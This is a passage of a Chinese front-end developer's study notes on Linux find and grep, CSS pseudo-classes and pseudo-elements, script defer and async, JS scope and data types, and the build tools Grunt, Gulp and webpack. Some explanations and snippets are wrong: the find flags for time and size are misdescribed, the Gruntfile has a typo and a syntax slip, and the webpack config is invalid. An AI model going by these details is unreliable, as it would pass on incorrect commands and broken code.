#在/etc目录下文件httpd.conf</li><li><code>find /etc -name &#39;*srm*&#39;</code>　　#使用通配符*(0或者任意多个)。表示在/etc目录下查找文件名中含有字符串‘srm’的文件</li><li><code>find . -name &#39;srm*&#39;</code> 　　#表示当前目录下查找文件名开头是字符串‘srm’的文件</li></ul></li><li>按照文件特征查找<ul><li><code>find / -amin -10</code> 　　# 查找在系统中最后10分钟访问的文件(access time)</li><li><code>find / -atime -2</code>　　 # 查找在系统中最后48小时访问的文件</li><li><code>find / -empty</code> 　　# 查找在系统中为空的文件或者文件夹</li><li><code>find / -group cat</code> 　　# 查找在系统中属于 group为cat的文件</li><li><code>find / -mmin -5</code> 　　# 查找在系统中最后5分钟里修改过的文件(modify time)</li><li><code>find / -mtime -1</code> 　　#查找在系统中最后24小时里修改过的文件</li><li><code>find / -user fred</code> 　　#查找在系统中属于fred这个用户的文件</li><li><code>find / -size +10000c</code>　　#查找出大于10000000字节的文件(c:字节，w:双字，k:KB，M:MB，G:GB)</li><li><code>find / -size -1000k</code> 　　#查找出小于1000KB的文件</li></ul></li><li>使用混合查找方式查找文件<ul><li><code>find /tmp -size +10000c -and -mtime +2</code> 　　#在/tmp目录下查找大于10000字节并在最后2分钟内修改的文件</li><li><code>find / -user fred -or -user george</code> 　　#在/目录下查找用户是fred或者george的文件文件</li><li><code>find /tmp ! -user panda</code>　　#在/tmp目录中查找所有不属于panda用户的文件</li></ul></li></ol><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>基本格式：<code>find  expression</code></p><ol><li>主要参数<br><strong>[options]主要参数：</strong><br>－c：只输出匹配行的计数。<br>－i：不区分大小写<br>－h：查询多文件时不显示文件名。<br>－l：查询多文件时只输出包含匹配字符的文件名。<br>－n：显示匹配行及行号。<br>－s：不显示不存在或无匹配文本的错误信息。<br>－v：显示不包含匹配文本的所有行。</li></ol><p><strong>pattern正则表达式主要参数：</strong><br>\： 忽略正则表达式中特殊字符的原有含义。<br>^：匹配正则表达式的开始行。<br>$: 匹配正则表达式的结束行。<br>\&lt;：从匹配正则表达 式的行开始。<br>>：到匹配正则表达式的行结束。<br>[ ]：单个字符，如[A]即A符合要求 。<br>[ - ]：范围，如[A-Z]，即A、B、C一直到Z都符合要求 。<br>.：所有的单个字符。</p><ul><li>：有字符，长度可以为0。</li></ul><ol start="2"><li>实例</li></ol><ul><li><code>grep &#39;test&#39; d*</code>　　#显示所有以d开头的文件中包含 test的行</li><li><code>grep ‘test’ aa bb cc</code> 　　 #显示在aa，bb，cc文件中包含test的行</li><li><code>grep ‘[a-z]\{5\}’ aa</code> 　　#显示所有包含每行字符串至少有5个连续小写字符的字符串的行</li><li><code>grep magic /usr/src</code>　　#显示/usr/src目录下的文件(不含子目录)包含magic的行</li><li><code>grep -r magic /usr/src</code>　　#显示/usr/src目录下的文件(包含子目录)包含magic的行</li><li><code>grep -w pattern files</code>   #只匹配整个单词，而不是字符串的一部分(如匹配’magic’，而不是’magical’)，</li></ul><hr><h2 id="css伪类和伪元素的区别"><a href="#css伪类和伪元素的区别" class="headerlink" title="css伪类和伪元素的区别"></a>css伪类和伪元素的区别</h2><h3 id="伪类"><a href="#伪类" class="headerlink" title="伪类"></a>伪类</h3><p><strong><em>伪类</em></strong> 用于选择DOM树上元素不同的状态，或者是DOM上无法用简单选择器选择的元素</p><ul><li><p>状态伪类<br><strong><em>状态伪类</em></strong> 是基于元素当前状态进行选择的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:link  :hover  :active  :visited</span><br><span class="line">:focus  :disabled  :enable  :checked</span><br></pre></td></tr></table></figure></li><li><p>结构伪类<br><strong><em>结构性伪类</em></strong> 是css3新增选择器，利用dom树进行元素过滤，通过文档结构的互相关系来匹配元素，能够减少class和id属性的定义，使文档结构更简洁。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:first-child  :last-child  :nth-child(n)  :nth-last-child() </span><br><span class="line">:empty</span><br></pre></td></tr></table></figure></li></ul><h3 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h3><p><strong><em>伪元素</em></strong> 是对元素中的特定内容进行操作，而不是描述状态。(css3中使用::)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">::first-letter  ::first-line  ::before  ::after  ::selection</span><br></pre></td></tr></table></figure></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在css3中，为了一个规范，我们使用 <code>:</code>表示伪类，<code>::</code> 表示伪元素，但是在css2中定义的伪元素，用来 <code>:</code> 和 <code>::</code> 都是可以的。如 <code>:before</code> 和 <code>::before</code> 作用是一样的</p><h3 id="伪元素的用途"><a href="#伪元素的用途" class="headerlink" title="伪元素的用途"></a>伪元素的用途</h3><ol><li><p>清除浮动</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 父级 */</span></span><br><span class="line"><span class="selector-class">.clear</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>画中间带文字的分割线<br><img src="../images/css/css_line.png" title="css分割线"></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.spliter</span><span class="selector-pseudo">::before</span>, <span class="selector-class">.spliter</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">border-top</span>: <span class="number">1px</span> solid black;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>形变的布局（上下、左右不一样）<br>原理同2</p></li><li><p>增大点击热区</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.btn</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">right</span>: -<span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: -<span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">left</span>: -<span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>伪元素的本质是在不增加dom结构的基础上添加的一个元素，在用法上跟真正的dom无本质区别。普通元素能实现的效果，伪元素都可以。有些用伪元素效果更好，代码更精简。</p><hr><h2 id="script-defer-和-async"><a href="#script-defer-和-async" class="headerlink" title="script defer 和 async"></a>script defer 和 async</h2><h3 id="无defer和async"><a href="#无defer和async" class="headerlink" title="无defer和async"></a>无defer和async</h3><p>当没有 <code>defer</code> 和 <code>async</code> 的时候，js会按照顺序来渲染和执行，如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"a.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>a.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">debugger</span></span><br></pre></td></tr></table></figure></p><p>在 <code>debugger</code> 执行的时候，页面还未渲染 <code>p</code> 段落。</p><h3 id="有defer"><a href="#有defer" class="headerlink" title="有defer"></a>有defer</h3><p><code>defer</code> 属性标注的脚本是 <strong>延迟脚本</strong>，使得浏览器延迟脚本的执行，也就是说，脚本会被 <strong>异步下载</strong> 但是不会被执行，直到文档的载入和解析完成，并可以操作，脚本才会被执行。<br><strong>延迟脚本</strong> 会按他们在文档里的出现顺序执行</p><h3 id="有async"><a href="#有async" class="headerlink" title="有async"></a>有async</h3><p><code>async</code> 属性标注的脚本是 <strong>异步脚本</strong>，即异步下载脚本时，不会阻塞文档解析，但是一旦下载完后，立即执行，阻塞文档解析。<br><strong>异步脚本</strong> 在它们载入后执行，但是不能保证执行顺序。</p><h3 id="图例"><a href="#图例" class="headerlink" title="图例"></a>图例</h3><p><img src="../images/javascript/defer_async.jpg" title="defer和async图解"><br><strong><span style="color:green;">绿色线</span></strong> 代表 <code>HTML</code> 解析，<strong><span style="color:blue;">蓝色线</span></strong> 代表网络读取 <code>JS</code>，<strong><span style="color:red;">红色线</span></strong> 代表 <code>JS</code> 执行时间。</p><hr><h2 id="静态（词法）作用域语言-和-动态作用域语言"><a href="#静态（词法）作用域语言-和-动态作用域语言" class="headerlink" title="静态（词法）作用域语言 和 动态作用域语言"></a>静态（词法）作用域语言 和 动态作用域语言</h2><ul><li>静态作用域语言：指变量的作用域是在代码编译阶段确定的，又称之为词法作用域。<code>JavaScript</code> 是静态作用域。</li><li>动态作用域语言：指变量作用域是在代码执行阶段确定的。</li></ul><p>理解 <code>JavaScript</code> 静态作用域的关键在于理解变量的作用域是由使用该变量的源代码位置确定，而不是由调用该变量时候的位置确定。<br>如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="string">"out"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> v = <span class="string">"in"</span>;</span><br><span class="line">  <span class="keyword">return</span> inside();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> v;</span><br><span class="line">&#125;</span><br><span class="line">outside();</span><br></pre></td></tr></table></figure></p><p>比较<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v = <span class="string">"out"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">outside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> v = <span class="string">"in"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">inside</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> inside();</span><br><span class="line">&#125;</span><br><span class="line">outside();</span><br></pre></td></tr></table></figure></p><p>第一段代码的执行结果是”out”，而第二段代码的执行结果是”in”。</p><hr><h2 id="js设计模式"><a href="#js设计模式" class="headerlink" title="js设计模式"></a>js设计模式</h2><blockquote><p>转载：<a href="https://segmentfault.com/a/1190000017787537" target="_blank" rel="noopener">segmentfault JavaScript中常用的设计模式</a></p></blockquote><table><tr><td>模式分类</td><td>名称</td></tr><tr><td rowspan="3">创建型</td><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">工厂模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">单例模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">原型模式</a></td></tr><tr><td rowspan="2">结构型</td><td><a href="https://github.com/sunzhaoye/blog/blob/masterdesignPattern/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">适配器模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">代理模式</a></td></tr><tr><td rowspan="5">行为型</td><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">策略模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/masterdesignPattern/%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">迭代器模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/masterdesignPattern/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">观察者模式(发布-订阅模式)</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">命令模式</a></td></tr><tr><td><a href="https://github.com/sunzhaoye/blog/blob/master/designPattern/%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F.md" target="_blank" rel="noopener">状态模式</a></td></tr></table><hr><h2 id="gulp和grunt的不同"><a href="#gulp和grunt的不同" class="headerlink" title="gulp和grunt的不同"></a>gulp和grunt的不同</h2><blockquote><p>转载：<a href="https://www.jianshu.com/p/fe96491ccf56" target="_blank" rel="noopener">简书 如何看待 Grunt、Gulp 和 Webpack</a></p></blockquote><p>相信小伙伴们不仅听说过 <code>Gulp</code> 和 <code>webpack</code> ，还听说过 <code>Grunt</code>。一般都觉得他们都是打包工具，但其实还是有区别的 。更准确的讲，<code>Grunt</code> 和 <code>Gulp</code> 属于任务流工具<code>Tast Runner</code> , 而 webpack属于模块打包工具 <code>Bundler</code></p><ol><li><p>Tast Runner</p><ul><li><p>Grunt</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Gruntfile.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">grunt</span>) </span>&#123;</span><br><span class="line">  grunt.initConfig(&#123;</span><br><span class="line">    <span class="comment">// js格式检查任务</span></span><br><span class="line">    jshint: &#123;</span><br><span class="line">      src: <span class="string">'src/test.js'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  代码压缩打包任务</span></span><br><span class="line">    uglify: &#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 导入任务插件</span></span><br><span class="line">  grunt.loadnpmTasks(<span class="string">'grunt-contrib-uglify'</span>);</span><br><span class="line">  <span class="comment">// 注册自定义任务, 如果有多个任务可以添加到数组中</span></span><br><span class="line">  grunt.regusterTask(<span class="string">'default'</span>, [<span class="string">'jshint'</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Gulp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> jshint = <span class="built_in">require</span>(<span class="string">'gulp-jshint'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代码检查任务 gulp 采取了pipe 方法，用流的方法直接往下传递</span></span><br><span class="line">gulp.task(<span class="string">'lint'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'src/test.js'</span>)</span><br><span class="line">    .pipe(jshint())</span><br><span class="line">    .pipe(jshint.reporter(<span class="string">'default'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩代码任务</span></span><br><span class="line">gulp.task(<span class="string">'compress'</span>， <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'src/test.js'</span>)</span><br><span class="line">    .pipe(uglify())</span><br><span class="line">    .pipe(gulp.dest(<span class="string">'build'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将代码检查和压缩组合，新建一个任务</span></span><br><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'lint'</span>, <span class="string">'compress'</span>]);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Bundler</p><ul><li><p>browserify<br><code>browserify</code> 是早期的模块打包工具，是先驱者，踏实的浏览器端使用 <code>CommonJS</code> 规范（<code>require--module.export</code>）的格式组织代码成为可能。在这之前，因为 <code>CommonJS</code> 与浏览器特性的不兼容问题，更多使用的是 <code>AMD</code>（<code>defined--require</code>）规范，当然后来又发展了ES6模块规范（<code>require--export</code>）<br>假设有如下模块add.js 和 文件test.js，test.js 使用CommonJS规范导入了模块add.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test.js</span></span><br><span class="line"><span class="keyword">var</span> add = <span class="built_in">require</span>(<span class="string">'./add.js'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">1</span>, <span class="number">2</span>));  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>我们知道，如果直接执行是执行不成功的，因为浏览器无法识别 <code>CommonJS</code> 语法，而 <code>browserify</code> 就是用来处理这个问题的，他将 <code>CommonJS</code> 语法进行装换，在命令行执行功如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify test.js &gt; bundle.js</span><br></pre></td></tr></table></figure><p>生成的bundle.js就是已经处理完毕，可供浏览器执行使用的文件，只需要将它插入到 <code>&lt;script&gt;</code> 中即可。</p></li></ul></li></ol><ul><li><p>webpack<br><code>webpack</code> 是后起之秀，它支持了 <code>AMD</code> 和 <code>CommonJS</code> 类型，通过 <code>loader</code> 机制也可以使用ES6模块格式。还有强大的 <code>code splitting</code>。<code>webpack</code> 是个十分强大的工具，它正在想一个全能型的构建工具发展。<br>    <code>webpack</code> 通过配置文件 <code>webpack.config.js</code> 进行功能配置，一个配置案例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"><span class="keyword">const</span> merge = <span class="built_in">require</span>(<span class="string">'webpack-merge'</span>)</span><br><span class="line"><span class="keyword">const</span> utils = <span class="built_in">require</span>(<span class="string">'./utils'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> config = &#123;</span><br><span class="line">  <span class="comment">// 入口</span></span><br><span class="line">  entry: &#123;</span><br><span class="line">    app: <span class="string">'./src/main.js'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 出口</span></span><br><span class="line">  output: &#123;</span><br><span class="line">    path: config.build.assetsRoot,</span><br><span class="line">    filename: <span class="string">'[name].js'</span>,</span><br><span class="line">    publicPath: process.env.NODE_ENV === <span class="string">'production'</span></span><br><span class="line">      ? config.build.assetsPublicPath</span><br><span class="line">      : config.dev.assetsPublicPath</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 加载器配置（需要加载器转化的模块类型）</span></span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="string">'/\.css$/'</span>,</span><br><span class="line">        use: [ <span class="string">'style-loader'</span>, <span class="string">'css-loader'</span> ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 插件</span></span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">'process.env'</span>: <span class="built_in">require</span>(<span class="string">'../config/dev.env'</span>)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      filename: <span class="string">'index.html'</span>,</span><br><span class="line">      template: <span class="string">'index.html'</span>,</span><br><span class="line">      inject: <span class="literal">true</span></span><br><span class="line">    &#125;),</span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = config</span><br></pre></td></tr></table></figure><p>一个相对比较全面的配置主要包含五个部分： 入口，出口，加载器，插件，模式。分别指定了开始读取文件的位置，编译后输出文件的路径，ES6语法转化加载器，更复杂功能的插件以及指定执行的环境变量。</p></li></ul><ol start="3"><li>区别<br><code>gulp</code> 和 <code>grunt</code> 是流管理工具，通过一个个task配置执行用户需要的功能，如格式检验，代码压缩等，值得一提的是，经过这两者处理的代码只是局部变量名被替换简化，整体并没有发生改变，还是你的代码。</li></ol><p>而 <code>webpack</code> 则进行了更彻底的打包处理，更加偏向对模块语法规则进行转换。主要任务是突破浏览器的鸿沟，将原本浏览器不能识别的规范和各种各样的静态文件进行分析，压缩，合并，打包，最后生成浏览器支持的代码，因此，<code>webapck</code> 打包过后的代码已经不是你写的代码了，或许你再去看，已经看不懂啦！</p><hr><h2 id="JavaScript的数据类型（按存储方式区分）："><a href="#JavaScript的数据类型（按存储方式区分）：" class="headerlink" title="JavaScript的数据类型（按存储方式区分）："></a>JavaScript的数据类型（按存储方式区分）：</h2><ol><li><p>五种基本数据类型（值类型）：<code>Null</code>、<code>Undefined</code>、<code>Boolean</code>、<code>String</code>、<code>Number</code>，是<strong>不可拆分</strong>的数据类型，存在于<strong>栈</strong>中，<code>Symbol</code>是es6新增的一种基本类型，不作讨论。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// 100</span></span><br></pre></td></tr></table></figure></li><li><p>一种复杂数据类型（引用类型）：统称 <code>Object</code> ，包括<code>Object</code>、<code>Array</code>、<code>Function</code>、<code>Date</code>、<code>RegExp</code>、<code>String</code>、<code>Boolean</code>、<code>Error</code>和自定义类，也就是通常意义上所说的<strong>类</strong>，存在于<strong>堆</strong>中，引用类型会共用存储空间。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;<span class="attr">age</span>: <span class="number">18</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b.age = <span class="number">20</span>;</span><br><span class="line"><span class="built_in">console</span>.log(a.age); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure></li></ol><hr><h2 id="JavaScript三大对象"><a href="#JavaScript三大对象" class="headerlink" title="JavaScript三大对象"></a>JavaScript三大对象</h2><ol><li><p>本地对象，如 <code>Object</code>、<code>Array</code>、<code>Function</code>、<code>Date</code>、<code>RegExp</code>、<code>String</code>、<code>Boolean</code>、<code>Error</code></p><ul><li>这些引用类型在运行过程中需要通过 <code>new</code> 来创建所需的实例对象。</li></ul></li><li><p>内置对象，如 <code>Global</code>、<code>Math</code>、(<code>JSON</code>)</p><ul><li>在 ECMAScript 程序开始执行前就存在，本身就是实例化内置对象，开发者无需再去实例化。</li><li>内置对象是本地对象的子集。</li></ul></li><li><p>宿主对象</p><ul><li>对于嵌入到网页中的JS来说，其宿主对象就是浏览器提供的对象，浏览器对象有很多，如 <code>Window</code> 和 <code>Document</code> 等。</li><li>所有的 <code>DOM</code> 和 <code>BOM</code> 对象都属于宿主对象。</li></ul></li></ol><hr><h2 id="强制（显式）类型转换和隐式类型转换"><a href="#强制（显式）类型转换和隐式类型转换" class="headerlink" title="强制（显式）类型转换和隐式类型转换"></a>强制（显式）类型转换和隐式类型转换</h2><h3 id="强制（显式）类型转换"><a href="#强制（显式）类型转换" class="headerlink" title="强制（显式）类型转换"></a>强制（显式）类型转换</h3><ol><li><p>调用方法</p><ul><li>转换成字符串 toString</li><li>转换成数字 parseInt、parseFloat</li></ul></li><li><p>调用构造函数</p><ul><li>Number()</li><li>Boolean()</li><li>String()</li></ul></li></ol><h3 id="隐式类型转换"><a href="#隐式类型转换" class="headerlink" title="隐式类型转换"></a>隐式类型转换</h3><p>  不同类型的变量比较要先转类型，叫做类型转换，类型转换也叫隐式转换。<br>  隐式转换通常发生在运算符加减乘除，等于，还有小于，大于等。</p><ol><li><p>四则运算</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 